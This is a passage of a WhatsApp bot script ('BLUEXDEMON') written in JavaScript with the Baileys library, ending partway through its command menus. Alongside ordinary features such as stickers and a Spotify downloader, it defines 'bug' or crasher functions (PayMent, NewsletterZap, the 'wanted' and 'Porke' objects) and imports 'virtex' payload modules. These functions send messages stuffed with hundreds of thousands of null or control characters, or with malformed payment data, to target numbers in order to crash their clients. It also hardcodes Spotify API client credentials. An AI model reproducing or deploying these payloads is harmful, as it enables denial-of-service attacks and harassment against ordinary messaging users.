/*
 CREATOR
 @DEMON KING
*/
module.exports = async (blue, m, store) => {
    try {
        const from = m.key.remoteJid
        const quoted = m.quoted ? m.quoted : m
        var body = (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ""
        const budy = (typeof m.text == 'string' ? m.text : '')
        const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><`™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!`™©®Δ^βα¦|/\\©^]/gi) : '.'
        const isCmd = body.startsWith(prefix)
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() //kalau mau no prefix ganti jadi ini : const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const mime = (quoted.msg || quoted).mimetype || ''
        const axios = require('axios');
        const text = q = args.join(" ")
        const isGroup = from.endsWith('@g.us')
        const botNumber = await blue.decodeJid(blue.user.id)
        const sender = m.key.fromMe ? (blue.user.id.split(':')[0] + '@s.whatsapp.net' || blue.user.id) : (m.key.participant || m.key.remoteJid)
        const senderNumber = sender.split('@')[0]
        const pushname = m.pushName || `${senderNumber}`
        const isBot = botNumber.includes(senderNumber)
        const groupMetadata = isGroup ? await blue.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = isGroup && groupMetadata ? groupMetadata.subject : '';
        const participants = isGroup ? await groupMetadata.participants : ''
        const groupAdmins = isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
        const groupOwner = isGroup ? groupMetadata.owner : ''
        const groupMembers = isGroup ? groupMetadata.participants : ''
        const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false
        const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false
        const isGroupAdmins = isGroup ? groupAdmins.includes(sender) : false
        const totalFitur = () => {
            var mytext = fs.readFileSync("./demontech.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length;
            return numUpper
        }
        async function ephoto(url, texk) {
      let form = new FormData();
      let gT = await axios.get(url, {
        headers: {
          'user-agent':
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
        },
      });
      let $ = cheerio.load(gT.data);
      let text = texk;
      let token = $('input[name=token]').val();
      let build_server = $('input[name=build_server]').val();
      let build_server_id = $('input[name=build_server_id]').val();
      form.append('text[]', text);
      form.append('token', token);
      form.append('build_server', build_server);
      form.append('build_server_id', build_server_id);
      let res = await axios({
        url: url,
        method: 'POST',
        data: form,
        headers: {
          Accept: '*/*',
          'Accept-Language': 'en-US,en;q=0.9',
          'user-agent':
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
          cookie: gT.headers['set-cookie']?.join('; '),
          ...form.getHeaders(),
        },
      });
      let $$ = cheerio.load(res.data);
      let json = JSON.parse($$('input[name=form_value_input]').val());
      json['text[]'] = json.text;
      delete json.text;
      let { data } = await axios.post(
        'https://en.ephoto360.com/effect/create-image',
        new URLSearchParams(json),
        {
          headers: {
            'user-agent':
              'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
            cookie: gT.headers['set-cookie'].join('; '),
          },
        }
      );
      return build_server + data.image;
    }
        const isAdmins = isGroup ? groupAdmins.includes(sender) : false
        const tanggal = moment.tz('Africa/Lagos').format('DD/MM/YY')
        const {
            Client
        } = require('ssh2');
        const jsobfus = require('javascript-obfuscator');
        const {
            addSaldo,
            minSaldo,
            cekSaldo
        } = require("./database/dtbs/deposit");
        const {
            mediafireDl
        } = require('./database/dtbs/mediafire.js')
        let db_saldo = JSON.parse(fs.readFileSync("./database/dtbs/saldo.json"));
        const fetch = require('node-fetch');
        const {
            beta1,
            beta2,
            buk1
        } = require("./database/lib/hdr.js")
        const xbug = fs.readFileSync(`./database/image/xbug.jpg`)
        const Xynz = fs.readFileSync(`./database/image/Xynz.jpg`)
        const zkosong = fs.readFileSync(`./database/image/zkosong.png`)
        const botname = "𝐁𝐋𝐔𝐄𝐗𝐃𝐄𝐌𝐎𝐍";
        const bugres = '𝗧𝗲𝗿𝗺𝗶𝗻𝗮𝘁𝗶𝗻𝗴 𝘁𝗮𝗿𝗴𝗲𝘁...'
        const canvafy = require('canvafy')
        const currentMode = blue.public ? 'Public' : 'Private';
        // VIRTEX
        const {
            ios
        } = require("./database/virtex/ios.js")
        const {
            telapreta3
        } = require("./database/virtex/telapreta3.js")
        const {
            convite
        } = require("./database/virtex/convite.js")
        const {
            bugpdf
        } = require("./database/virtex/bugpdf.js")
        const {
            cP
        } = require('./database/virtex/bugUrl.js')
        // Auto Blocked Nomor +212
        if (m.sender.startsWith('212')) return blue.updateBlockStatus(m.sender, 'block')
        // auto anti bug
        if (global.antibug) {
            if (!isGroup && m.isBaileys && m.fromMe) {
                await blue.sendMessage(m.chat, {
                    delete: {
                        remoteJid: m.chat,
                        fromMe: true,
                        id: m.key.id
                    }
                })
                await blue.sendMessage(`${global.owner}@s.whatsapp.net`, {
                    text: `*BUG MESSAGE DETECTED*
*Number* ${m.sender.split("@")[0]}`
                }, {
                    quoted: null
                })
            }
        }
        blue.sendImageAsSticker = async (jid, media, m, options = {}) => {
            let {
                Sticker,
                StickerTypes
            } = require('wa-sticker-formatter')
            const getRandom = (ext) => {
                return `${Math.floor(Math.random() * 10000)}${ext}`
            }
            let jancok = new Sticker(media, {
                pack: global.packname, // The pack name
                author: global.author, // The author name
                type: StickerTypes.FULL, // The sticker type
                categories: ['🤩', '🎉'], // The sticker category
                id: '12345', // The sticker id
                quality: 50, // The quality of the output file
                background: '#FFFFFF00' // The sticker background color (only for full stickers)
            })
            let stok = getRandom(".webp")
            let nono = await jancok.toFile(stok)
            let nah = fs.readFileSync(nono)
            await blue.sendMessage(jid, {
                sticker: nah
            }, {
                quoted: m
            })
            return await fs.unlinkSync(stok)
        }
        const nanototalpitur = () => {
            var mytext = fs.readFileSync("./demontech.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length
            return numUpper
        }
        const restrictedTargets = ['2347041039367'];
        const themeemoji = "👾"
        // Random Color
        const listcolor = ['red', 'green', 'yellow', 'blue', 'magenta', 'cyan', 'white']
        const randomcolor = listcolor[Math.floor(Math.random() * listcolor.length)]

        function runtime(seconds) {
            let hours = Math.floor(seconds / 3600);
            let minutes = Math.floor((seconds % 3600) / 60);
            let secondsLeft = Math.floor(seconds % 60);

            return `${hours} hrs,${minutes} mins,${secondsLeft} secs`;
        }
        let run = runtime(process.uptime())
        let runx = runtimex(process.uptime());

        // Command Yang Muncul Di Console
        if (isCmd) {
            console.log(chalk.white.blue.bold('RECIEVED COMMAND'), color(`[ 𝙱𝙻𝚄𝙴 𝙳𝙴𝙼𝙾𝙽 ]`, `blue`), color(`FROM`, `red`), color(`${pushname}`, `red`), color(`Text :`, `yellow`), color(`${body}`, `blue`))
        }

        // Days
        const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
        const wib = moment.tz('Asia/Jakarta').format('HH : mm :ss')
        const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')
        const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')

        const time2 = moment().tz('Africa/Lagos').format('HH:mm:ss')
        if (time2 < "23:59:00") {
            var ucapanWaktu = 'wagwan 👾'
        }
        if (time2 < "19:00:00") {
            var ucapanWaktu = 'wagwan  👾'
        }
        if (time2 < "18:00:00") {
            var ucapanWaktu = 'wagwan  👾'
        }
        if (time2 < "15:00:00") {
            var ucapanWaktu = 'wagwan 👾'
        }
        if (time2 < "10:00:00") {
            var ucapanWaktu = 'wagwan 👾'
        }
        if (time2 < "05:00:00") {
            var ucapanWaktu = 'wagwan 👾'
        }
        if (time2 < "03:00:00") {
            var ucapanWaktu = 'wagwan  👾'
        }

        blue.autoshalat = blue.autoshalat ? blue.autoshalat : {}
        let id = m.chat
        if (id in blue.autoshalat) {
            return false
        }
        let jadwalSholat = {
            shubuh: '04:29',
            terbit: '05:44',
            dhuha: '06:02',
            dzuhur: '12:02',
            ashar: '15:15',
            magrib: '17:52',
            isya: '19:01',
        }
        const datek = new Date((new Date).toLocaleString("en-US", {
            timeZone: "Africa/Lagos"
        }));
        const hours = datek.getHours();
        const minutes = datek.getMinutes();
        const timeNow = `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}`
        for (let [sholat, waktu] of Object.entries(jadwalSholat)) {
            if (timeNow === waktu) {
                blue.autoshalat[id] = [
                    blue.sendMessage(m.chat, {
                        audio: {
                            url: 'https://github.com/Bolaolat/Giveaway1/raw/refs/heads/main/Phonk.mp3'
                        },
                        mimetype: 'audio/mp4',
                        ptt: true,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                mediaType: 1,
                                mediaUrl: '',
                                title: `𝕯𝖊𝖒𝖔𝖓 𝖐𝖎𝖓𝖌👾`,
                                body: `𝐃𝐄𝐌𝐎𝐍-𝐕𝟑🎧`,
                                sourceUrl: '',
                                thumbnail: await fs.readFileSync('./database/image/hmm.jpg'),
                                renderLargerThumbnail: true
                            }
                        }
                    }, {}),
                    setTimeout(async () => {
                        delete client.autoshalat[m.chat]
                    }, 57000)
                ]
            }
        }

        // Read Database
        const buyer = JSON.parse(fs.readFileSync("./database/lib/secret.json"))
        const contacts = JSON.parse(fs.readFileSync("./database/dtbs/contacts.json"))
        const prem = JSON.parse(fs.readFileSync("./database/dtbs/premium.json"))
        const ownerNumber = JSON.parse(fs.readFileSync("./database/dtbs/owner.json"))

        // Cek Database
        const isBuyer = buyer.includes(sender)
        const isContacts = contacts.includes(sender)
        const isPremium = prem.includes(sender)
        const isOwner = ownerNumber.includes(senderNumber) || isBot
        // BUTTON VIDEO
        blue.sendButtonVideo = async (jid, buttons, quoted, opts = {}) => {
            var video = await prepareWAMessageMedia({
                video: {
                    url: opts && opts.video ? opts.video : ''
                }
            }, {
                upload: blue.waUploadToServer
            })
            let message = generateWAMessageFromContent(jid, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            body: {
                                text: opts && opts.body ? opts.body : ''
                            },
                            footer: {
                                text: opts && opts.footer ? opts.footer : ''
                            },
                            header: {
                                hasMediaAttachment: true,
                                videoMessage: video.videoMessage,
                            },
                            nativeFlowMessage: {
                                buttons: buttons,
                                messageParamsJson: ''
                            },
                            contextInfo: {
                                externalAdReply: {
                                    title: global.namabot,
                                    body: `𝐃𝐄𝐌𝐎𝐍-𝐕𝟑🩸`,
                                    thumbnailUrl: global.imageurl,
                                    sourceUrl: global.isLink,
                                    mediaType: 1,
                                    renderLargerThumbnail: true
                                }
                            }

                        }
                    }
                }
            }, {
                quoted
            })
            await blue.sendPresenceUpdate('composing', jid)
            return blue.relayMessage(jid, message["message"], {
                messageId: message.key.id
            })
        }

        function runtimex(seconds) {
            let hours = Math.floor(seconds / 3600);
            let minutes = Math.floor((seconds % 3600) / 60);
            let secondsLeft = Math.floor(seconds % 60);

            return `*${hours}* 𝗛𝗼𝘂𝗿 *${minutes}* 𝗠𝗶𝗻𝘂𝘁𝗲 *${secondsLeft}* 𝗦𝗲𝗰𝗼𝗻𝗱𝘀`;
        }
        async function sendQP(target, filterName, parameters, filterResult, clientNotSupportedConfig, clauseType, clauses, filters) {
            var qpMessage = generateWAMessageFromContent(target, proto.Message.fromObject({
                'qp': {
                    'filter': {
                        'filterName': filterName,
                        'parameters': parameters,
                        'filterResult': filterResult,
                        'clientNotSupportedConfig': clientNotSupportedConfig
                    },
                    'filterClause': {
                        'clauseType': clauseType,
                        'clauses': clauses,
                        'filters': filters
                    }
                }
            }), {
                userJid: target
            });

            await blue.relayMessage(target, qpMessage.message, {
                participant: {
                    jid: target
                },
                messageId: qpMessage.key.id
            });
        }

        async function sendSessionStructure(target, sessionVersion, localIdentityPublic, remoteIdentityPublic, rootKey, previousCounter, senderChain, receiverChains, pendingKeyExchange, pendingPreKey, remoteRegistrationId, localRegistrationId, needsRefresh, aliceBaseKey) {
            var sessionStructure = generateWAMessageFromContent(target, proto.Message.fromObject({
                'sessionStructure': {
                    'sessionVersion': sessionVersion,
                    'localIdentityPublic': localIdentityPublic,
                    'remoteIdentityPublic': remoteIdentityPublic,
                    'rootKey': rootKey,
                    'previousCounter': previousCounter,
                    'senderChain': senderChain,
                    'receiverChains': receiverChains,
                    'pendingKeyExchange': pendingKeyExchange,
                    'pendingPreKey': pendingPreKey,
                    'remoteRegistrationId': remoteRegistrationId,
                    'localRegistrationId': localRegistrationId,
                    'needsRefresh': needsRefresh,
                    'aliceBaseKey': aliceBaseKey
                }
            }), {
                userJid: target
            });

            await blue.relayMessage(target, sessionStructure.message, {
                participant: {
                    jid: target
                },
                messageId: sessionStructure.key.id
            });
        }

        const wanted = {
            key: {
                remoteJid: 'p',
                fromMe: false,
                participant: '0@s.whatsapp.net'
            },
            message: {
                "interactiveResponseMessage": {
                    "body": {
                        "text": "Sent",
                        "format": "DEFAULT"
                    },
                    "nativeFlowResponseMessage": {
                        "name": "galaxy_message",
                        "paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"ZetExecute\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"czazxvoid@sky.id\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0003".repeat(500000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                        "version": 3
                    }
                }
            }
        }


        async function PayMent(LockJids) {
            var messageContent = generateWAMessageFromContent(LockJids, proto.Message.fromObject({
                'viewOnceMessage': {
                    'message': {
                        'interactiveMessage': {
                            'header': {
                                "hasMediaAttachment": true,
                                'sequenceNumber': '0',
                                "jpegThumbnail": ""
                            },
                            'nativeFlowMessage': {
                                "buttons": [{
                                    "name": "review_and_pay",
                                    "buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"▾ 𝐙͢𝐍ͮ𝐗 ⿻ 𝐂𝐋͢𝐈𝚵𝐍͢𝐓 ▾\":\k${bugpdf},\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
                                }],
                                "messageParamsJson": '\0'.repeat(10000),
                            }
                        }
                    }
                }
            }), {});
            blue.relayMessage(LockJids, messageContent.message, {
                'messageId': messageContent.key.id
            });
        }

        async function NewsletterZap(LockJids) {
            var messageContent = generateWAMessageFromContent(LockJids, proto.Message.fromObject({
                'viewOnceMessage': {
                    'message': {
                        "newsletterAdminInviteMessage": {
                            "newsletterJid": `120363298524333143@newsletter`,
                            "newsletterName": "🔥፝⃟ ꙳𝐏𝐚𝐤𝐓𝐳𝐲🔥፝⃟` " + "\u0000".repeat(920000),
                            "jpegThumbnail": "",
                            "caption": `Undangan Admin Channel bluexzo Script`,
                            "inviteExpiration": Date.now() + 1814400000
                        }
                    }
                }
            }), {
                'userJid': LockJids
            });
            await blue.relayMessage(LockJids, messageContent.message, {
                'participant': {
                    'jid': LockJids
                },
                'messageId': messageContent.key.id
            });
        }

        const Porke = {
            key: {
                participant: `0@s.whatsapp.net`,
                ...(m.chat ? {
                    remoteJid: "status@broadcast"
                } : {})
            },
            'message': {
                "interactiveMessage": {
                    "header": {
                        "hasMediaAttachment": true,
                        "jpegThumbnail": fs.readFileSync(`./database/image/zkosong.png`)
                    },
                    "nativeFlowMessage": {
                        "buttons": [{
                            "name": "review_and_pay",
                            "buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"️࿆᷍🩸⃟༑⌁⃰𝐙𝐲𝐧 𝑪͢𝒓𝒂ͯ͢𝒔𝒉 𝐈𝐧͢𝐟𝐢ͮ𝐧͢𝐢𝐭𝐲͜͡⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
                        }]
                    }
                }
            }
        }

        const Porke2 = {
            key: {
                participant: `0@s.whatsapp.net`,
                ...(m.chat ? {
                    remoteJid: "status@broadcast"
                } : {})
            },
            'message': {
                "interactiveMessage": {
                    "header": {
                        "hasMediaAttachment": true,
                        "jpegThumbnail": fs.readFileSync(`./database/image/zkosong.png`)
                    },
                    "nativeFlowMessage": {
                        "buttons": [{
                            "name": "review_and_pay",
                            "buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"️࿆᷍🩸⃟༑⌁⃰𝐙𝐲𝐧 𝑪͢𝒓𝒂ͯ͢𝒔𝒉 𝐈𝐧͢𝐟𝐢ͮ𝐧͢𝐢𝐭𝐲͜͡⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
                        }]
                    }
                }
            }
        }

        let list = []
        for (let i of ownerNumber) {
            list.push({
                displayName: await blue.getName(i + '@s.whatsapp.net'),
                vcard: `BEGIN:VCARD\n
VERSION:3.0\n
N:${await blue.getName(i + '@s.whatsapp.net')}\n
FN:${await blue.getName(i + '@s.whatsapp.net')}\n
item1.TEL;waid=${i}:${i}\n
item1.X-ABLabel:Ponsel\n
item2.EMAIL;type=INTERNET: barasukimewing@gmail.com\n
item2.X-ABLabel:Email\n
item3.URL:https://whatsapp.com/channel/0029VarTDNiFcowFnrgUeU2v
item3.X-ABLabel:YouTube\n
item4.ADR:;;Indonesia;;;;\n
item4.X-ABLabel:Region\n
END:VCARD`
            })
        }

        function monospace(string) {
            return '```' + string + '```'
        }

        function toRupiah(angka) {
            var saldo = '';
            var angkarev = angka.toString().split('').reverse().join('');
            for (var i = 0; i < angkarev.length; i++)
                if (i % 3 == 0) saldo += angkarev.substr(i, 3) + '.';
            return '' + saldo.split('', saldo.length - 1).reverse().join('');
        }

        // Gak Usah Di Apa Apain Jika Tidak Mau Error
        try {
            ppuser = await blue.profilePictureUrl(m.sender, 'image')
        } catch (err) {
            ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
        }
        async function spotifydl(url) {
            return new Promise(async (resolve, reject) => {
                try {
                    const kemii = await axios.get(
                        `https://api.fabdl.com/spotify/get?url=${encodeURIComponent(url)}`, {
                            headers: {
                                accept: "application/json, text/plain, */*",
                                "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                                "sec-ch-ua": "\"Not)A;Brand\";v=\"24\", \"Chromium\";v=\"116\"",
                                "sec-ch-ua-mobile": "?1",
                                "sec-ch-ua-platform": "\"Android\"",
                                "sec-fetch-dest": "empty",
                                "sec-fetch-mode": "cors",
                                "sec-fetch-site": "cross-site",
                                Referer: "https://spotifydownload.org/",
                                "Referrer-Policy": "strict-origin-when-cross-origin",
                            },
                        }
                    );
                    const kemi = await axios.get(
                        `https://api.fabdl.com/spotify/mp3-convert-task/${kemii.data.result.gid}/${kemii.data.result.id}`, {
                            headers: {
                                accept: "application/json, text/plain, */*",
                                "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                                "sec-ch-ua": "\"Not)A;Brand\";v=\"24\", \"Chromium\";v=\"116\"",
                                "sec-ch-ua-mobile": "?1",
                                "sec-ch-ua-platform": "\"Android\"",
                                "sec-fetch-dest": "empty",
                                "sec-fetch-mode": "cors",
                                "sec-fetch-site": "cross-site",
                                Referer: "https://spotifydownload.org/",
                                "Referrer-Policy": "strict-origin-when-cross-origin",
                            },
                        }
                    );
                    const result = {};
                    result.title = kemii.data.result.name;
                    result.type = kemii.data.result.type;
                    result.artis = kemii.data.result.artists;
                    result.durasi = kemii.data.result.duration_ms;
                    result.image = kemii.data.result.image;
                    result.download = "https://api.fabdl.com" + kemi.data.result.download_url;
                    resolve(result);
                } catch (error) {
                    reject(error);
                }
            });
        };
        async function searchSpotify(query) {
            try {
                const access_token = await getAccessToken();
                const response = await axios.get(`https://api.spotify.com/v1/search?q=${query}&type=track&limit=10`, {
                    headers: {
                        Authorization: `Bearer ${access_token}`,
                    },
                });
                const data = response.data;
                const tracks = data.tracks.items.map(item => ({
                    name: item.name,
                    artists: item.artists.map(artist => artist.name).join(', '),
                    popularity: item.popularity,
                    link: item.external_urls.spotify,
                    image: item.album.images[0].url,
                    duration_ms: item.duration_ms,
                }));
                return tracks;
            } catch (error) {
                console.error('Error searching Spotify:', error);
                throw 'An error occurred while searching for songs on Spotify.';
            }
        }
        async function getAccessToken() {
            try {
                const client_id = 'acc6302297e040aeb6e4ac1fbdfd62c3';
                const client_secret = '0e8439a1280a43aba9a5bc0a16f3f009';
                const basic = Buffer.from(`${client_id}:${client_secret}`).toString("base64");
                const response = await axios.post('https://accounts.spotify.com/api/token', 'grant_type=client_credentials', {
                    headers: {
                        Authorization: `Basic ${basic}`,
                        'Content-Type': 'application/x-www-form-urlencoded',
                    },
                });
                const data = response.data;
                return data.access_token;
            } catch (error) {
                console.error('Error getting Spotify access token:', error);
                throw 'An error occurred while obtaining Spotify access token.';
            }
        }
        // FUNCTION OBFUSCATOR 
        async function obfus(query) {
            return new Promise((resolve, reject) => {
                try {
                    const obfuscationResult = jsobfus.obfuscate(query, {
                        compact: false,
                        controlFlowFlattening: true,
                        controlFlowFlatteningThreshold: 1,
                        numbersToExpressions: true,
                        simplify: true,
                        stringArrayShuffle: true,
                        splitStrings: true,
                        stringArrayThreshold: 1
                    });
                    const result = {
                        status: 200,
                        author: `𝕯𝖊𝖒𝖔𝖒 𝖐𝖎𝖓𝖌👾`,
                        result: obfuscationResult.getObfuscatedCode()
                    }
                    resolve(result)
                } catch (e) {
                    reject(e)
                }
            })
        }

        //Status
        if (!blue.public) {
            if (!m.key.fromMe) return
        }

async function loading() {
    var baralod = [
        "𝐆𝐮𝐞𝐬𝐬 𝐰𝐡𝐚𝐭🤡",
        "👾",
        "👾👾",
        "👾👾👾",
        "👾👾👾👾",
        "👾👾👾👾👾",
        "👾👾👾👾👾👾",
        "🤡𝕴 𝖐𝖓𝖔𝖜 𝖞𝖔𝖚𝖗 𝖘𝖊𝖈𝖗𝖊𝖙🤡",
    ];
    
    let { key } = await blue.sendMessage(from, {
        text: '𝐆𝐮𝐞𝐬𝐬 𝐰𝐡𝐚𝐭🤡'
    });

    for (let i = 0; i < baralod.length; i++) {
        await blue.sendMessage(from, {
            text: baralod[i],
            edit: key
        });
        
        // Add delay of 1 second (1000 ms)
        await new Promise(resolve => setTimeout(resolve, 500));
    }
}


        // Fake Resize
        const fkethmb = await reSize(ppuser, 300, 300)

        // Cuma Fake
        const sendOrder = async (jid, text, orid, img, itcount, title, sellers, tokens, ammount) => {
            const order = generateWAMessageFromContent(jid, proto.Message.fromObject({
                "orderMessage": {
                    "orderId": orid,
                    "thumbnail": img,
                    "itemCount": itcount,
                    "status": "INQUIRY",
                    "surface": "CATALOG",
                    "orderTitle": title,
                    "message": text,
                    "sellerJid": sellers,
                    "token": tokens,
                    "totalAmount1000": ammount,
                    "totalCurrencyCode": "IDR",
                }
            }), {
                userJid: jid,
                quoted: m
            })
            blue.relayMessage(jid, order.message, {
                messageId: order.key.id
            })
        }
        const bluereply = (teks) => {
            blue.sendMessage(from, {
                text: teks
            }, {
                quoted: m
            })
        }
        // Function Reply
        const reply = (teks) => {
            blue.sendMessage(m.chat, {
                text: teks,
                contextInfo: {
                    mentionedJid: [sender],
                    forwardingScore: 9999999,
                    isForwarded: true,
                    "externalAdReply": {
                        "showAdAttribution": true,
                        "containsAutoReply": true,
                        "title": `ʙʟᴜᴇ ᴄʀᴀꜱʜᴇʀ`,
                        "body": `${ucapanWaktu} ${pushname}`,
                        "previewType": "PHOTO",
                        "thumbnailUrl": `https://l.top4top.io/s_32310ywi80.jpeg`, // Replace with your image URL
                        "thumbnail": null, // You can set this to null since you are using thumbnailUrl
                        "sourceUrl": `${isLink}`
                    }
                }
            }, {
                quoted: m
            });
        }

        const fkontak = {
            key: {
                fromMe: false,
                participant: `0@s.whatsapp.net`,
                ...(from ? {
                    remoteJid: "status@broadcast"
                } : {})
            },
            message: {
                'contactMessage': {
                    'displayName': `${pushname}`,
                    'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;Vinzx,;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
                    'jpegThumbnail': {
                        url: 'https://g.top4top.io/p_3194iz70l0.jpg'
                    }
                }
            }
        }

        function parseMention(text = '') {
            return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
        }

        if (m.isGroup && !m.key.fromMe && !isOwner && antilink) {
            if (!isBotAdmins) return
            if (budy.match(`whatsapp.com`)) {
                blue.sendMessage(m.chat, {
                    text: `*Antilink Group Terdeteksi*\n\nKamu Akan Dikeluarkan Dari Group ${groupMetadata.subject}`
                }, {
                    quoted: m
                })
                blue.groupParticipantsUpdate(m.chat, [sender], 'delete')
                blue.sendMessage(m.chat, {
                    delete: m.key
                })
            }
        }

        switch (command) {
            case 'menu': {
                await loading()
                const darkphonk = fs.readFileSync('./database/Phonk.mp3');
                const image = fs.readFileSync('./database/image/xbug.jpg');
                const version = require("baileys/package.json").version;

                const menu2 = `┏━━ ｢ \`𝐁𝐋𝐔𝐄𝐗𝐃𝐄𝐌𝐎𝐍\` ｣ ━━❐
┃✾ᐉ 𝐍𝐚𝐦𝐞 : *${pushname}*
┃✾ᐉ 𝐑𝐮𝐧 : *${run}*
┃✾ᐉ 𝐏𝐫𝐞𝐟𝐢𝐱 : *${prefix}*
┃✾ᐉ 𝐌𝐨𝐝𝐞 : *${currentMode}*
┃✾ᐉ 𝐓𝐢𝐦𝐞 : *${time2}*
┗━━━━━━━━━━━━━━━━━━❐
👾 \`𝕻𝖗𝖔𝖙𝖊𝖈𝖙 𝖙𝖍𝖔𝖘𝖊 𝖞𝖔𝖚 𝖑𝖔𝖛𝖊\` 👾

         *𝖜𝖍𝖔 𝖉𝖆𝖗𝖊𝖘*
  『〆⑆  *ᴀʟʟᴍᴇɴᴜ* 』
  『〆⑆  *ʙᴜɢᴍᴇɴᴜ* 』
  『〆⑆  *xᴄʀᴀꜱʜ* 』
  『〆⑆  *ꜱᴘᴇᴄɪᴀʟᴍᴇɴᴜ* 』
  
> Great thanks goes to👇
> 𝔻𝕆ℕ 𝕋𝔼ℂℍ 𝕀ℕℂ
`;
                // Send the image
                await blue.sendMessage(m.chat, {
                    image: image,
                    caption: menu2
                });

                // Send the audio as a push-to-talk (PTT) message
                await blue.sendMessage(m.chat, {
                    audio: darkphonk,
                    mimetype: 'audio/mp4',
                    ptt: true
                });

                break;
            }
            case 'bluemenu':
            case 'allmenu': {
                await loading()
                const version = require("baileys/package.json").version;
                let run = runtime(process.uptime());

